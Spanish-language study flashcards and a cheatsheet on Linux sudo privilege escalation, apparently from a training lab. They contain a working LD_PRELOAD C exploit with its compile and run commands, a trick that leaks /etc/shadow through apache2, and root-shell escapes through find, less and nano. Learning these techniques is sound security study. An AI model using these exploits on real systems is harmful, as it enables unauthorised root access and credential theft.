### Flashcards — Privilege Escalation with `sudo`

---

**Q:** ¿Qué comando permite ver qué programas puedes ejecutar con `sudo` y bajo qué condiciones?
**A:** `sudo -l`

---

**Q:** ¿Qué recurso central se usa para ver exploits o bypass de programas ejecutables con `sudo`?
**A:** [GTFOBins](https://gtfobins.github.io/)

---

**Q:** ¿Cómo se puede abusar de Apache2 si se tiene `sudo` sobre él?
**A:** Usando `apache2 -f /etc/shadow`, provocando un error que muestra la primera línea de `/etc/shadow`.

---

**Q:** ¿Qué es `LD_PRELOAD`?
**A:** Variable de entorno que fuerza a un programa a cargar una librería compartida antes de ejecutarse.

---

**Q:** ¿Qué condición debe cumplirse para usar `LD_PRELOAD` con `sudo`?
**A:** Que `env_keep` permita mantener la variable de entorno en `sudoers`.

---

**Q:** ¿Qué contiene un exploit básico en C con `LD_PRELOAD` para escalar privilegios?
**A:**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

---

**Q:** ¿Cómo compilar el exploit `LD_PRELOAD` en C?
**A:**

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

---

**Q:** ¿Cómo ejecutar un binario con `LD_PRELOAD` para obtener root?
**A:**

```bash
sudo LD_PRELOAD=/ruta/shell.so <programa_permitido>
```

Ejemplo:

```bash
sudo LD_PRELOAD=/home/karen/shell.so find
```

---
### Cheatsheet — Privilege Escalation con `sudo`

| Técnica                                    | Comando / Código                                                                                                                                                                              | Resultado                                                |
| ------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------- |
| **Enumerar privilegios `sudo`**            | `sudo -l`                                                                                                                                                                                     | Lista binarios que el usuario puede ejecutar con `sudo`  |
| **Buscar binarios explotables**            | [GTFOBins](https://gtfobins.github.io/)                                                                                                                                                       | Referencia de binarios y cómo abusarlos con `sudo`       |
| **Apache2 leak**                           | `sudo apache2 -f /etc/shadow`                                                                                                                                                                 | Error muestra la primera línea de `/etc/shadow`          |
| **LD\_PRELOAD - C exploit**                | `c<br>#include <stdio.h><br>#include <sys/types.h><br>#include <stdlib.h><br><br>void _init() {<br>  unsetenv("LD_PRELOAD");<br>  setgid(0);<br>  setuid(0);<br>  system("/bin/bash");<br>} ` | Código malicioso que da shell como root                  |
| **Compilar exploit .so**                   | `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`                                                                                                                                         | Genera librería compartida maliciosa                     |
| **Ejecutar exploit con binario permitido** | `sudo LD_PRELOAD=/ruta/shell.so <programa>`                                                                                                                                                   | Eleva privilegios a root (si `env_keep` está habilitado) |
| **Ejemplo práctico con `find`**            | `sudo LD_PRELOAD=/home/karen/shell.so find`                                                                                                                                                   | Spawnea shell root                                       |

---
---
---


Significado de la salida de `sudo -l`:

---

### Defaults

* `env_reset`: limpia variables de entorno al ejecutar con `sudo`.
* `mail_badpass`: envía correo si alguien mete una contraseña incorrecta (en tu caso irrelevante porque tienes `NOPASSWD`).
* `secure_path`: restringe el `$PATH` cuando corres cosas con `sudo`.

---

### Reglas de `sudo`

```
(ALL) NOPASSWD: /usr/bin/find
(ALL) NOPASSWD: /usr/bin/less
(ALL) NOPASSWD: /usr/bin/nano
```

* `(ALL)`: puedes ejecutar como **cualquier usuario**, incluido `root`.
* `NOPASSWD`: no se te pedirá contraseña.
* `/usr/bin/find`, `/usr/bin/less`, `/usr/bin/nano`: binarios permitidos.

---

### Implicación

Tienes **ejecución directa como root** de esos tres programas.
Cada uno es explotable para obtener shell root:

1. **find**

```bash
sudo find . -exec /bin/bash \;
```

2. **less**

```bash
sudo less /etc/passwd
# dentro de less, presiona:
!bash
```

3. **nano**

```bash
sudo nano
# dentro de nano:
^R^X   (Ctrl+R, Ctrl+X)
command: reset; bash 1>&0 2>&0
```

Resultado: shell con UID=0 (root).

---
